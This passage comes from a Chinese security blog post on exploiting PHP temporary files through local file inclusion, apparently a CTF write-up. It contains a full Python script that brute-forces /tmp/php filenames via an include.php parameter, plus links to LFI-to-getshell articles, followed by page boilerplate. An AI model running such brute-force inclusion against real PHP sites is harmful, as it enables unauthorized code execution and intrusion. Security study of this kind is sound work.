generate_tmp_files()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br>charset = string.digits + string.letters<br><br>host = <span class="hljs-string">&quot;192.168.43.155&quot;</span><br>port = <span class="hljs-number">80</span><br>base_url = <span class="hljs-string">&quot;http://%s:%d&quot;</span> % (host, port)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">brute_force_tmp_files</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> charset:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> charset:<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> charset:<br>                <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> charset:<br>                    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> charset:<br>                        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> charset:<br>                            filename = i + j + k + l + m + n<br>                            url = <span class="hljs-string">&quot;%s/include.php?f=/tmp/php%s&quot;</span> % (<br>                                base_url, filename)<br>                            <span class="hljs-built_in">print</span> url<br>                            <span class="hljs-keyword">try</span>:<br>                                response = requests.get(url)<br>                                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> response.content:<br>                                    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Include success!&quot;</span><br>                                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>                            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                                <span class="hljs-built_in">print</span> e<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    brute_force_tmp_files()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure>
+
+
+
+<p>第一个脚本是写临时文件令其崩溃的，第二个是爆破临时文件的</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/dfd049924258">LFI via SegmentFault - 简书 (jianshu.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201136#h3-8">PHP LFI 利用临时文件 Getshell 姿势-安全客 - 安全资讯平台 (anquanke.com)</a></p>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>PHP变量覆盖漏洞</div>
+      <div>https://decemberus.github.io/Decemberus.github-io/2022/02/19/PHP临时文件机制与利用的思考/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Decemberus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年2月19日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/Decemberus.github-io/2022/03/15/php%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%A6%99%E7%94%A8/" title="PHP协议及死亡绕过">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PHP协议及死亡绕过</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/Decemberus.github-io/2022/02/17/%E5%88%A9%E7%94%A8PHP%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7Bypass/" title="PHP字符串解析">
+                        <span class="hidden-mobile">PHP字符串解析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/Decemberus.github-io/js/events.js" ></script>
+<script  src="/Decemberus.github-io/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/Decemberus.github-io/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/Decemberus.github-io/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/Decemberus.github-io/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
